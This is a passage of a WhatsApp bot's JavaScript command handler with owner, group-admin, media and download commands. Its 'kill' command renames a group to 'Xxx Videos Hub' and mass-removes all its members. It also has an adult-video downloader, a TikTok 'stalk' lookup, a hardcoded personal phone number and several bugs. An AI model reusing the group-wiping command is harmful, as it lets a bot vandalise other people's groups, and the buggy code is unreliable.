if (!Owner) return ReplyMultiMenu2('*Only Owner*') 
let getGroups = await bot.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `𖥂 *List Groups*\n\n💺Total Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await bot.groupMetadata(x)
teks += `⿻ *INFO GROUP*\n│𖥂 *NAME:* ${metadata2.subject}\n│𖥂 *ID :* ${metadata2.id}\n│𖥂 *MEMBER :* ${metadata2.participants.length}\n╰────|⿻\n\n`
}
ReplyMultiMenu2(teks)
}
break
//==================================================//                
        case "block": { 
 if (!Owner) return ReplyMultiMenu2 (mess.owner) 
 if (!m.quoted) throw `𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!`  
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	 if (users == "254107065646@s.whatsapp.net") return m.reply("𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆 𝗢𝘄𝗻𝗲𝗿 😡");
		  if (users  == bot.decodeJid(bot.user.id)) throw '𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆𝘀𝗲𝗹𝗳 𝗶𝗱𝗶𝗼𝘁 😡';
 await bot.updateBlockStatus(users, 'block'); 
 ReplyMultiMenu2 (`𝗕𝗹𝗼𝗰𝗸𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆!`); 
 } 
 break; 
//==================================================// 
        case 'idch': case 'cekidch': {
if (!text) return ReplyMultiMenu2("channel link?")
if (!text.includes("https://whatsapp.com/channel/")) return ReplyMultiMenu2("Link must be valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await bot.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : loli });
await bot.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
//==================================================//            
        case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    ReplyMultiMenu2(bibleChapter)
  } catch (error) {
    ReplyMultiMenu2(`Error: ${error.message}`)
  }
  }
  break
//==================================================//         
        case 'quran': {
    try {
    
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    ReplyMultiMenu2(quranSurah)

    if (json.data.recitation.full) {
      bot.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    ReplyMultiMenu2(`Error: ${error.message}`)
  }
  }
  break
//==================================================//               
        case "smile": {
await bot.sendMessage(m.chat, { react: { text: "🤔",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./Media/babe.jpg") }, { upload: bot.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `*Mr Smile*`,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥
𝐑𝐞𝐀𝐋 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫
* horny dev
* single
* rude
* arrested for being sexy
* JavaScript coder
* efootball player
* liverpool fan
* enough to be old
* MTTI student`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp\",\"url\":\"https://wa.me/254107065646\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/mr_smile_modder\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram Channel\",\"url\":\"https://t.me/\",\"merchant_url\":\"https://www.google.com\"}`
},          
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"WhatsappChannel\",\"url\":\"https://whatsapp.com/channel/0029VaesBAXJJhzefVszDu3h\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: loli})
await bot.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break

//==================================================//              
        case 'listpc': {
if (!Owner) return ReplyMultiMenu2(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
ReplyMultiMenu2(teks)
}
break
//==================================================//      
        case 'add': {
if (!isGroup) return ReplyMultiMenu2(mess.group)
if (!isBotAdmins) return ReplyMultiMenu2(mess.group)
if (!Owner) return ReplyMultiMenu2(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => ReplyMultiMenu2(util.format(res))).catch((err) => ReplyMultiMenu2(util.format(err)))
}
break
//==================================================//
        case 'system' : 
        case 'tes' : 
        case 'bot' : {
  let os = require('os')
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())          
ReplyMultiMenu4(`𝐖𝐢𝐬𝐞-𝐀𝐥

* Status Bot : *Online*✅
* Developer : *Mr Smile*
* Mode Bot : *${bot.public ? "Public" : "Self"}*
* Runtime : ${run}
`)
    buttons: [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Full Code!",
copy_code: "PutraGanteng",
}),
},
]
}
break       
//==================================================//           
        case 'reject': case 'reject-all': {
	if (!m.isGroup) return m.ReplyMultiMenu2(mess.group)
if (!isAdmins) return m.ReplyMultiMenu2(mess.group)
if (!isBotAdmins) return ReplyMultiMenu2("bot must be admin idiot")

const responseList = await bot.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return m.reply("no pending requests detected");

for (const participan of responseList) {
    const response = await bot.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "reject" // or "reject"
    );
    console.log(response);
}
ReplyMultiMenu2("pending requests have been rejected!");

}
 break;
//==================================================//           
        case 'autoswview':
    case 'statusview':{
             if (!Owner) return ReplyMultiMenu2(mess.owner)
               if (args.length < 1) return ReplyMultiMenu2('on/off?')
               if (args[0] === 'on') {
                  antiautostatus = true
                  ReplyMultiMenu2(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiautostatus = true
                  ReplyMultiMenu2(`${command} is disabled`)
               }
            }
            break
//==================================================//              
        case "unblock": { 
 if (!Owner) return ReplyMultiMenu2 (mess.owner) 
 if (!m.quoted) throw `𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!`; 
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'; 
 await client.updateBlockStatus(users, 'unblock'); 
 m.reply (`𝗨𝗻𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆✅!`); 
 } 
 break;
//==================================================//             
        case 'gcprofile': {
 function convertTimestamp(timestamp) {
  const d = new Date(timestamp * 1000);
  const daysOfWeek = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  return {
    date: d.getDate(),
    month: new Intl.DateTimeFormat('en-US', { month: 'long' }).format(d),
    year: d.getFullYear(),
    day: daysOfWeek[d.getUTCDay()],
    time: `${d.getUTCHours()}:${d.getUTCMinutes()}:${d.getUTCSeconds()}`
  }
}

if (!m.isGroup) return ReplyMultiMenu2("This command is meant for groups");

let info = await bot.groupMetadata(m.chat);
let ts = await convertTimestamp(info.creation);

try {
        pp = await bot.profilePictureUrl(chat, 'image');
      } catch {
    pp = 'https://files.catbox.moe/ne5wcc.png';
      }

await bot.sendMessage(m.chat, { image: { url: pp }, 
          caption: `_Name_ : *${info.subject}*\n\n_ID_ : *${info.id}*\n\n_Group owner_ : ${'@'+info.owner.split('@')[0]} || 'No Creator'\n\n_Group created_ : *${ts.day}, ${ts.date} ${ts.month} ${ts.year}, ${ts.time}*\n\n_Participants_ : *${info.size}*\n_Members_ : *${info.participants.filter((p) => p.admin == null).length}*\n\n_Admins_ : *${Number(info.participants.length - info.participants.filter((p) => p.admin == null).length)}*\n\n_Who can send message_ : *${info.announce == true ? 'Admins' : 'Everyone'}*\n\n_Who can edit group info_ : *${info.restrict == true ? 'Admins' : 'Everyone'}*\n\n_Who can add participants_ : *${info.memberAddMode == true ? 'Everyone' : 'Admins'}*`
        }, {quoted: m })
}
	 break;

//==================================================//                             
                case 'approve': case 'approve-all': {
	if (!m.isGroup) return m.ReplyMultiMenu2(mess.group)
if (!isAdmins) return m.reply(mess.group)
if (!isBotAdmins) return ReplyMultiMenu2("bot must be admin idiot")

const responseList = await bot.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return ReplyMultiMenu2("no pending requests detected at the moment!");

for (const participan of responseList) {
    const response = await bot.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "approve" // or "reject"
    );
    console.log(response);
}
ReplyMultiMenu2("ACTIVATOR has approved all pending requests✅");

}
 break;
//==================================================//      
case 'h':
case 'hidetag': {
if (!isGroup) return ReplyMultiMenu2(mess.group)
if (!Owner) return ReplyMultiMenu2(mess.owner)
if (m.quoted) {
bot.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
bot.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
}
break
//==================================================//        
        case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `Mr Smile`
  let NoOwn = `254107065646`
  var contact = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION: JavaScript coder\nX-WA-BIZ-NAME:[[ ༑ ACTIVATOR ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: mdmodes
  })
  bot.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;
//==================================================//            
        case 'style': case 'fancy': {
if (!text) return ReplyMultiMenu2('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += ` ${i.name}* : ${i.result}\n\n`
}
ReplyMultiMenu2(teks)
}
break //==================================================//      
        case 'tagall': {
if (!isGroup) return ReplyMultiMenu2(mess.group)
if (!Owner) return ReplyMultiMenu2(mess.owner)
if (!text) return ReplyMultiMenu2("woi")
bot.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await bot.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: text
}
]
}
}, {
quoted: m
})
}
break
//==================================================//              
        case  'getppgc':
if (!isGroup) return 
ReplyMultiMenu2("process...")
try {
var ppimg = await bot.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await bot.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
break
//==================================================//      
        case "promote": case "promot": {
if (!isGroup) return ReplyMultiMenu2(`for group only`)
if (!isAdmins && !Owner) return m.ReplyMultiMenu2(`Command reserved for group admins only`)
if (!isBotAdmins) return ReplyMultiMenu2(`bot is not an admin idiot`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => ReplyMultiMenu2(`User ${target.split("@")[0]} is now an admin`)).catch((err) => ReplyMultiMenu2(err.toString()))
} else return ReplyMultiMenu2('Example: 254XXX/@tag')}
break  
//==================================================//              
        case "totalcase": {
penis = fs.readFileSync("./wise.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n• ');

ReplyMultiMenu2(`Total case: ${totalCases}\n\n• ${totalCases > 0 ? listCases : "No cases found."}`);
}
break
//==================================================//              
        case 'delpp': {
if (!Owner) return ReplyMultiMenu2(mess.owner);
bot.removeProfilePicture(bot.user.id)
ReplyMultiMenu2("success")
}
break
//==================================================//               
        case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return ReplyMultiMenu2(`Reply Video/Image with Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await bot.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return ReplyMultiMenu2('Maximum video period? 10s!')
let media = await quoted.download()
let encmedia = await bot.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return ReplyMultiMenu2(`reply photo/Video with Caption ${prefix + command}\nDuration Video 1-9 seconds`)
}
}
break
//==================================================//          
        case "xxxdown": 
case "downxxx":{
    if (!q) return ReplyMultiMenu2(`Example: ${prefix + command} URL`);
    ReplyMultiMenu2("in process....");
    const axios = require('axios');
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/download/xnxx?url=${q}`;
        const { data } = await axios.get(apiUrl);
        
        if (!data.status) return m.reply("Failed to fetch video data");
        
        const result = data.result;
        
        let caption = `*XNXX DOWNLOADER*\n\n`;
        caption += `*Title:* ${result.title}\n`;
        caption += `*Duration:* ${result.duration} seconds\n`;
        caption += `*Info:* ${result.info.trim()}\n`;
        caption += `*URL:* ${result.URL}\n\n`;
        caption += `_Sending video, please wait..._`;
        
        await bot.sendMessage(m.chat, { 
            image: { url: result.image }, 
            caption: caption 
        }, { quoted: m });
        
        await bot.sendMessage(m.chat, { 
            video: { url: result.files.high }, 
            caption: `*High Quality*\n${result.title}`,
            fileName: `${result.title}.mp4`
        }, { quoted: m });
        
        await bot.sendMessage(m.chat, { 
            video: { url: result.files.low }, 
            caption: `*Low Quality*\n${result.title}`,
            fileName: `${result.title}-low.mp4`
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        ReplyMultiMenu2(`Error: ${error.message}`);
    }
    }
    break
//==================================================//        
        case "demote": case "demote": {
if (!isGroup) return ReplyMultiMenu2(mess.group)
if (!isAdmins && !Owner) return m.ReplyMultiMenu2(mess.admin)
if (!isBotAdmins) return ReplyMultiMenu2(`bot is not an admin in this group`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => ReplyMultiMenu2(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => m.ReplyMultiMenu2(err.toString()))
} else return ReplyMultiMenu2('example:254XX')}
break
//==================================================//           
 case "tourl": {
try {
 if (!/image|video|sticker|audio/.test(mime)) 
 return ReplyMultiMenu2(`
*❌ Syntax Error!!*
Send/Reply the Video/Image With Caption ${command}`);
 if (!m.quoted) 
 return reply(`
*❌ Syntax Error!!*
Send/Reply the Video/Image With Caption ${command}`);
 await bot.sendMessage(m.chat, {
 react: { text: '📄', key: m.key }
 });
 let media = await m.quoted.download();
 if (!media) throw new Error("❌ Media download failed");
 const uploadImage = require('./list/lib/uploadImage.js');
 const uploadFile = require('./list/lib/uploadFile.js');
 let isImage = /video|sticker\/(webp)|audio|image\/(png|jpe?g|gif)/.test(mime);
 let link = await (isImage ? uploadImage : uploadFile)(media);
 if (!link) throw new Error("❌ Failed to upload media");
let msg = await generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: `✅ Succes Convert To link\nExpired: Undefined\nPress The Button Below To Copy`,
},
footer: { text: "" },
header: {
title: `[ ! ] INFORMATION`,
subtitle: "",
hasMediaAttachment: false,
},
nativeFlowMessage: {
buttons: [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Link!",
copy_code: `${link}`,
}),
},
],
},
contextInfo: { mentionedJid: [m.sender] },
},
},
},
},
{ quoted: m }
);

await bot.relayMessage(msg.key.remoteJid, msg.message, {});
} catch (error) {
 console.error(error); // Log error di konsol untuk debugging
 ReplyMultiMenu2(`❌ Error occurred!\n\n${error.message || "Failed to process the request."}`);
}
break;
}
//==================================================//                
        case "tts": {
if (!text) return ReplyMultiMenu2("example:Hallo")
if (text.length >= 300) return ReplyMultiMenu2("maximum text must be 300!")
ReplyMultiMenu2("process.....")
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
bot.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return ReplyMultiMenu2(e.toString())
}
}
break
//==================================================//          
        case "setbio": case "setbiobot": {
if (!Owner) return m.ReplyMultiMenu2(mess.owner)
if (!text) return m.ReplyMultiMenu2('reply a rext')
bot.updateProfileStatus(text)
ReplyMultiMenu2("Success updated bio ✅")
}
break
//==================================================//            
        case 'toimage':
case 'toimg': {
if (!/webp/.test(mime)) return ReplyMultiMenu2(`Reply sticker with caption *${prefix + command}*`)

let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
bot.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
fs.unlinkSync(ran)
})

}
break
//==================================================//          
        case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) ReplyMultiMenu2(`reply stiker with caption *${prefix + command}*`)
var media = await bot.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
bot.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
await fs.unlinkSync(media)
}
break
//==================================================//          
        case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return ReplyMultiMenu2(`tag/reply Video/Audio with Caption ${prefix + command}`)
let media = await bot.downloadMediaMessage(qmsg)
let audio = await toAudio(media, 'mp4')
bot.sendMessage(m.chat, {
audio: audio,
mimetype: 'audio/mpeg'
}, {
quoted: m
})
}
break
//==================================================//    
        
                 case "kill": {
	  if (!m.isGroup) return m.ReplyMultiMenu2(mess.group)          
 if (!isBotAdmins) return ReplyMultiMenu2(`bot is not admin in the group`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != bot.decodeJid(bot.user.id)).map(_0x3c0c18 => _0x3c0c18.id);
		      
          ReplyMultiMenu2("Initializing Kill command💀...");
      
      await bot.removeProfilePicture(m.chat);
      await bot.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await bot.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");
      
	
          setTimeout(() => {
            bot.sendMessage(m.chat, {
              'text': `⚙️ *Operation Protocol: KILL MODE ENGAGED* ⚙️

✅ All parameters successfully locked and confirmed.
📤 Initializing *Total Wipe* for ${raveni.length} group participants...

⏳ *Execution begins in 1 second...*

👋 *Farewell, everyone.*

⚠️ *This action is FINAL and cannot be undone!*`
            }, {
              'quoted': m
            });
            setTimeout(() => {
              bot.groupParticipantsUpdate(m.chat, raveni, "remove");
              setTimeout(() => {
                ReplyMultiMenu2("Succesfully removed All group participants✅️.\n\nGoodbye group owner 👋, its too cold in here 🥶.");
bot.groupLeave(m.chat);	      
              }, 1000);
            }, 1000);
          }, 1000);
        };	      
          break; //==================================================//      
        case 'autorecordtype':

                if (!Owner) return ReplyMultiMenu2(mess.owner)

                if (args.length < 1) return ReplyMultiMenu2(`Example ${prefix + command} on/off`)

                if (q === 'on') {

                    autorecordtype = true

                    ReplyMultiMenu2(`Successfully changed auto recording and typing to ${q}`)

                } else if (q === 'off') {

                    autorecordtype = false

                    ReplyMultiMenu2(`Successfully changed auto recording and typing to ${q}`)

                }

                break  
//==================================================//      
        case "getpp": {
if (q) {
try {
var ppWong = await bot.profilePictureUrl(q, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
bot.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await bot.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://telegra.ph/file/7cde96ce87ae7d9bd22a4.jpg"
}
bot.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
}
}
break
//==================================================//
        case 'autotype':
                if (!Owner) return ReplyMultiMenu2(mess.owner)
                if (args.length < 1) return ReplyMultiMenu2(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    ReplyMultiMenu2(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    ReplyMultiMenu2(`Successfully changed auto-typing to ${q}`)
                }
                break
//==================================================//            
        case "listserver": {
if (global.apikey.length < 1) return ReplyMultiMenu2("you don't have an apikey!")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyMultiMenu2("invalid request")
let messageText = "*List Servers *\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`🌧️ ID Server ${s.id}\`
* Server name : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await bot.sendMessage(m.chat, { text: messageText }, { quoted: loli })
}
break
//==================================================//             
        case "eval": {
if (!Owner) return ReplyMultiMenu2(mess.owner);
if (!m.quoted) return ReplyMultiMenu2(`reply a quoted text.`);
const kripto = require('crypto');
let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
let jeneng = `MessageData_${kripto.randomBytes(8).toString('hex')}.json`;

await fs.writeFileSync(jeneng, penis);
await ReplyMultiMenu2(penis);
await bot.sendMessage(m.chat, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
await fs.unlinkSync(jeneng);
}
break
//==================================================//             
        case 'tiktokstalk':
case 'ttstalk': {
  if (!text) return ReplyMultiMenu2(`Username? `)
let res = await fg.ttStalk(args[0])
let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
await bot.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
break
//==================================================//            
        case 'translate':{
  	if (!q) return ReplyMultiMenu2(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       ReplyMultiMenu2(result.text)
    } catch (e) {
        return ReplyMultiMenu2(err)
    } 
    }
    break
//==================================================//     
        case 'song': {
  if (!text) return ReplyMultiMenu2('provide a song title lagu!\nExample: *play ransoms*');

  try {
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API not found');
    let json = await res.json();
    if (!json.success || !json.result) throw new Error('an api error occured');
    const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;
    const thumbnail = await (await fetch(image)).buffer();
    await bot.sendMessage(m.chat, {
      audio: { url: download.audio },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title,
          body: `${author.name} • ${duration.timestamp}`,
          thumbnail,
          mediaUrl: url,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.warn('Fallback to Nekorinn API:', e.message);
    try {
      let res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
      let data = await res.json();
      if (!data.status || !data.result) throw new Error('Respon cadangan 1 tidak valid');
      const { title, channel, duration, imageUrl, link } = data.result.metadata;
      const downloadUrl = data.result.downloadUrl;
